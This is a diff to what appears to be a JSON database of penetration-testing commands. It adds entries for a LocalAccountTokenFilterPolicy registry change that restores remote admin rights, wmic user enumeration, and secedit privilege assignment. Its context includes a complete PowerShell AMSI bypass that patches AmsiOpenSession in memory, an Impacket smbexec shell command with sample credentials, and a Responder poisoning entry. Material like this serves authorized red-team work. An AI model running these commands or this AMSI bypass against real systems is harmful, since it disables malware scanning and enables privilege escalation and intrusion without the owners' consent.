@@ -2006,6 +2006,23 @@
     "name": "winPEAS"
   },
   {
+    "description": "One of the features implemented by User Access Control (UAC), LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session, if you are using WinRM, you are confined to a limited access token with no administrative privileges.\n\nTo be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:\n",
+    "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction"
+    ],
+    "name": "LocalAccessFilterPolicy-bypass"
+  },
+  {
     "description": "Impacket's smbexec.py. This will give you an interactive shell on the Windows host.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
     "command": "python3 smbexec.py test.local/john:password123@10.10.10.1\n",
     "items": [
@@ -2454,6 +2471,23 @@
     "name": "Mount-SMB"
   },
   {
+    "description": "\"wmic useraccounts\" is a Windows Management Instrumentation Command-line utility that retrieves information about user accounts on a system, providing details such as username, full name, and SID. This example gives the username with corresponding SID.\n",
+    "command": "wmic useraccount get name,sid\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149"
+    ],
+    "name": "wmic-list-users"
+  },
+  {
     "description": "With this code in Powershell it is possible to bypass the AMSI. We\u2019ll modify the assembly instructions themselves instead of the data they are acting upon in a technique known as binary patching. We can use this technique to hotpatch the code and force it to fail even if the data structure is valid. This is done by overwriting the 3 Bytes TEST RDX,RDX with an XOR RAX,RAX instruction, forcing the execution flow to the error branch, which will disable AMSI.\n\nCommand Reference:\n```\nObtain the memory address of AmsiOpenSession (Lookup Function)\n\nModify the memory permissions where AmsiOpenSession is located (Lookup with DelegateType)\n\nModify the three bytes at that location. (TEST RDX,RDX with an XOR RAX,RAX, Copy function)\n```\n",
     "command": "AMSI bypass in assembly based on the AmsiOpenSession\n",
     "code": "function LookupFunc { \n  Param ($moduleName, $functionName)\n  \n  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |\n  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].\n      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n  $tmp=@()\n  $assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\")\n  {$tmp+=$_}} \n  return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) \n}\n\nfunction getDelegateType {\n  Param (\n      [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,\n      [Parameter(Position = 1)] [Type] $delType = [Void] \n  )\n  $type = [AppDomain]::CurrentDomain.\n  DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\n  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')\n\n  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')\n\n  return $type.CreateType() \n}\n\n[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession\n$oldProtectionBuffer = 0\n$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))\n$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) \n\n$buf = [Byte[]] (0x48, 0x31, 0xC0)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)\n",
@@ -2629,6 +2663,26 @@
       "https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy"
     ],
     "name": "Impacket-SecretsDump"
+  },
+  {
+    "description": "It is possible to assign special privileges to any user, independent of their group memberships. To do so, we can use the secedit command. Therefore, you have to convert the .inf file into a .sdb file which is then used to load the configuration back into the system. In the extra code is shown how to export the current config which you can modify, for example by adding users to privileges rights lines, and then convert it to .sdb and load back.\n\nCommand Reference:\n```\nconfig.sdb: database file holding the modified config\n\nconfig.inf: new configuration\n```\n",
+    "command": "secedit /configure /db config.sdb /cfg config.inf\n",
+    "code": "secedit /export /cfg config.inf\n\nsecedit /import /cfg config.inf /db config.sdb\n\nsecedit /configure /db config.sdb /cfg config.inf\n",
+    "items": [
+      "Shell",
+      "Username",
+      "Password"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit"
+    ],
+    "name": "secedit"
   },
   {
     "description": "Responder is an LLMNR, NBT-NS, and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB. The following command will put Responder in analyze mode, listening for NBT-NS, BROWSER, and LLMNR requests without responding.\n\nCommand Reference:\n\n\tInterface: eth0\n",
